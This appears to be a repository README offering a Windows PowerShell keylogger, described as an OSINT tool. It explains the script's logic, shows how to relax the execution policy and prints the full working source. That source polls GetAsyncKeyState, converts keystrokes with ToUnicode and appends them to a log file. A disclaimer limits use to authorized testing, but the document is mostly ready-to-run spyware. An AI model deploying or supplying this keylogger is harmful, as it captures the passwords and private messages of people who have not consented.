# keylogger
A Windows Powershell program that records keystrokes made on a computer keyboard and a great OSINT tool.

## How the script works?

- The script first sets up a path to a log file where the keystrokes will be recorded.
- It then defines a set of Windows API functions using C# code. These functions will be used to retrieve the keystrokes.
- The script enters a loop where it continuously checks for the existence of the log file.
- Inside the loop, it waits for 40 milliseconds and then loops through all the possible ASCII codes for keyboard keys.
- For each key, it uses the Windows API functions to check if it is currently being pressed.
- If it is, it maps the key to a virtual key code and retrieves the state of the keyboard.
- Finally, it uses the ToUnicode Windows API function to convert the key code into a character and writes it to the log file.

## Preparation

To run this PowerShell script on Windows 11, you need to have PowerShell installed on your system.
PowerShell is included by default in Windows 11, so you should not need to install anything extra.
However, depending on your system settings, you may need to enable PowerShell scripts to run by setting the execution policy to allow local scripts to run.

You can do this by opening PowerShell as an administrator and running the command:
```powershell
Set-ExecutionPolicy RemoteSigned
```

This will allow you to run locally created PowerShell scripts.

## Usage

```powershell
PS C:\> .\Keylogger.ps1
```

## Example script

```powershell
$path = "C:\temp\keylogger.txt"


if ((Test-Path $path) -eq $false) {New-Item $path}

    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    

    try {
        
        while ((Test-Path $path) -ne $false){

           

            Start-Sleep -Milliseconds 40

            
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                
                $state = $API::GetAsyncKeyState($ascii)

                
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success -and (Test-Path $path) -eq $true) {
                       
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    } 
     finally {exit}
```

## Disclaimer
"The scripts in this repository are intended for authorized security testing and/or educational purposes only. Unauthorized access to computer systems or networks is illegal. These scripts are provided "AS IS," without warranty of any kind. The authors of these scripts shall not be held liable for any damages arising from the use of this code. Use of these scripts for any malicious or illegal activities is strictly prohibited. The authors of these scripts assume no liability for any misuse of these scripts by third parties. By using these scripts, you agree to these terms and conditions."

## License Information

This library is released under the [Creative Commons ShareAlike 4.0 International license](https://creativecommons.org/licenses/by-sa/4.0/). You are welcome to use this library for commercial purposes. For attribution, we ask that when you begin to use our code, you email us with a link to the product being created and/or sold. We want bragging rights that we helped (in a very small part) to create your 9th world wonder. We would like the opportunity to feature your work on our homepage.
